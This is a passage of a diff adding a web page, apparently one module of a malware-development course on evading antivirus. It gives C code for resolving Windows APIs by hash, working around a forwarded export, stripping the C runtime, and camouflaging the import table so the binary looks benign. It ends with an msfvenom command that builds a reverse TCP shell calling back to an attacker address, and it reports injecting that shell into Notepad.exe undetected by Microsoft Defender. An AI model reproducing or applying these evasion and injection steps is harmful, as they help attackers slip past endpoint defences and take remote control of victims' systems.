+	g_Api.pUnhookWindowsHookEx = (fnUnhookWindowsHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), UnhookWindowsHookEx_JOAA);
+
+	if (g_Api.pCallNextHookEx == NULL || g_Api.pDefWindowProcW == NULL || g_Api.pGetMessageW == NULL || g_Api.pSetWindowsHookExW == NULL || g_Api.pUnhookWindowsHookEx == NULL)
+		return FALSE;
+
+	// 	Kernel32.dll exported
+	g_Api.pGetModuleFileNameW          = (fnGetModuleFileNameW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetModuleFileNameW_JOAA);
+	g_Api.pCloseHandle                 = (fnCloseHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CloseHandle_JOAA);
+	g_Api.pCreateFileW                 = (fnCreateFileW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CreateFileW_JOAA);
+	g_Api.pGetTickCount64              = (fnGetTickCount64)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetTickCount64_JOAA);
+	g_Api.pOpenProcess                 = (fnOpenProcess)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), OpenProcess_JOAA);
+	g_Api.pSetFileInformationByHandle  = (fnSetFileInformationByHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), SetFileInformationByHandle_JOAA);
+
+	if (g_Api.pGetModuleFileNameW == NULL || g_Api.pCloseHandle == NULL || g_Api.pCreateFileW == NULL || g_Api.pGetTickCount64 == NULL || g_Api.pOpenProcess == NULL || g_Api.pSetFileInformationByHandle == NULL)
+		return FALSE;
+
+	return TRUE;
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The WinAPIs hashes are generated by the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Hasher</code> project as shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/av-bypass-916815114-a9254939-9382-4dfe-8c32-54f871d9fc47.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The next step is to utilize the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">g_Api</code> structure to call all WinAPIs, by prefixing each one with <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">g_Api.&lt;WinAPI&gt;</code>, for example, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">OpenProcess</code> should be called as <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">g_Api.pOpenProcess</code>.</p><h3 id="systemfunction032-api-hashing-error" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>SystemFunction032 API Hashing Error</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">While applying API hashing to the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SystemFunction032</code> function (that is not included in the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">g_Api</code> structure) the following exception will occur.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/av-bypass-10.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">An exception is thrown when attempting to execute <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SystemFunction032</code> at address <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">0x00007FFC42C09FF2</code>, which appears to be a valid address since it&#x27;s being fetched using the line of code below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressH(LoadLibraryA(&quot;Advapi32&quot;), SystemFunction032_JOAA);</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Use xdbg to check the address to understand the root of the problem.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/av-bypass-11.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/av-bypass-12.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><h3 id="forwarded-functions" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Forwarded Functions</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The address being retrieved using <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">GetProcAddressH</code> does not lead to a function and instead points to the string &quot;CRYPTSP.SystemFunction032&quot;. This indicates the presence of a <em>forwarded function</em>, where a function exported from one DLL (DLL A) is located in another DLL (DLL B). When using the original <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">GetProcAddress</code> WinAPI to fetch the address of this kind of function, additional logic is performed behind the scenes to retrieve the address in DLL B. This is all done seamlessly and therefore one may mistakenly assume that the function is exported from DLL A.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Therefore, instead of loading <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Advapi32.dll</code> (DLL A) to find <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SystemFunction032</code>, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Cryptsp.dll</code> (DLL B) should be loaded as it holds the actual address. This is indicated by the string &quot;CRYPTSP.SystemFunction032&quot;, which provides a hint as to where the function is located. This is necessary because <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">GetProcAddressH</code> does not handle forwarded functions. By making this minor change, the code will now compile and execute successfully.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/av-bypass-13.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><h3 id="crt-library-removal" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>CRT Library Removal</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Following the steps outlined in the <em>CRT Library Removal &amp; Malware Compiling</em> module will enable the removal of the CRT Library. An error will arise because of the usage of <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">printf</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">wprintf</code> functions. To solve this, a custom function can be used to replace these functions. The printing functionality will only be enabled when debug mode is enabled. The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">printf</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">wprintf</code> functions replacement should be saved in a new file called <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Debug.h</code>, which must be included in all files that call <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">printf</code> or <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">wprintf</code>.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/av-bypass-14.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong>Debug.h</strong></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">#pragma once#include &lt;Windows.h&gt;// uncomment to enable debug mode
+//\
+#define DEBUG
+
+
+
+#ifdef DEBUG// wprintf replacement
+#define PRINTW( STR, ... )                                                                  \
+    if (1) {                                                                                \
+        LPWSTR buf = (LPWSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );         \
+        if ( buf != NULL ) {                                                                \
+            int len = wsprintfW( buf, STR, __VA_ARGS__ );                                   \
+            WriteConsoleW( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
+            HeapFree( GetProcessHeap(), 0, buf );                                           \
+        }                                                                                   \
+    }  // printf replacement
+#define PRINTA( STR, ... )                                                                  \
+    if (1) {                                                                                \
+        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );           \
+        if ( buf != NULL ) {                                                                \
+            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
+            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
+            HeapFree( GetProcessHeap(), 0, buf );                                           \
+        }                                                                                   \
+    }  #endif // DEBUG</code></pre>
+        </div>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">// Only print if debug mode is enabled
+#ifdef DEBUGPRINTA(&quot;...&quot;);
+#endif</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">If one attempts to compile after this, they will encounter more errors because <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">memcpy</code>, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">memset</code>, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">toupper</code> are also imported from the CRT library. To fix this issue, custom functions that will execute the same logic must be added and stored in <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">WinApi.c</code>, which is shown below.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong>WinApi.c</strong></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">CHAR _toUpper(CHAR C)
+{
+	if (C &gt;= &#x27;a&#x27; &amp;&amp; C &lt;= &#x27;z&#x27;)
+		return C - &#x27;a&#x27; + &#x27;A&#x27;;
+
+	return C;
+}
+
+PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size)
+{
+	for (volatile int i = 0; i &lt; Size; i++) {
+		((BYTE*)Destination)[i] = ((BYTE*)Source)[i];
+	}
+	return Destination;
+}
+
+
+
+extern void* __cdecl memset(void*, int, size_t);
+#pragma intrinsic(memset)#pragma function(memset)void* __cdecl memset(void* Destination, int Value, size_t Size) {
+	unsigned char* p = (unsigned char*)Destination;
+	while (Size &gt; 0) {
+		*p = (unsigned char)Value;
+		p++;
+		Size--;
+	}
+	return Destination;
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">There is one final error to solve which is the undefined <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">_fltused</code> symbol. The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">_fltused</code> symbol is a global variable in the CRT Library which is used to determine if floating-point operations were used in a program. By creating a new variable named <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">_fltused</code> and setting it to zero, the error will be resolved. This mirrors the initialization of the variable by the CRT Library, which will result in the compiler building the project with no errors.</p><h3 id="iat-camouflage" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>IAT Camouflage</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Adding the header file <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">IatCamouflage.h</code>, which contains the same code introduced in the <em>IAT Camouflage</em> module, should be done as a final step. <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">IatCamouflage.h</code> should be included in the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">main.c</code> file only and called at the beginning of the main function, so that the import address table of the implementation will appear benign.</p><h3 id="final-result" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Final Result</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This demonstration uses Msfvenom&#x27;s reverse TCP shell payload which is generated via the command below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.16.111 LPORT=4444 -f raw -o reverse.bin</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">AV.exe</code>&#x27;s IAT is shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/av-bypass-15.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Next, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">AV.exe</code> injects into <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Notepad.exe</code> with Microsoft Defender enabled.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/av-bypass-16.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">A successful reverse shell is established to the attacking machine and a sample command is executed.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/av-bypass-17.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Notepad.exe</code> process has PID 20288, which matches the PID in the previous picture.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/av-bypass-18.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div></main></body></html>
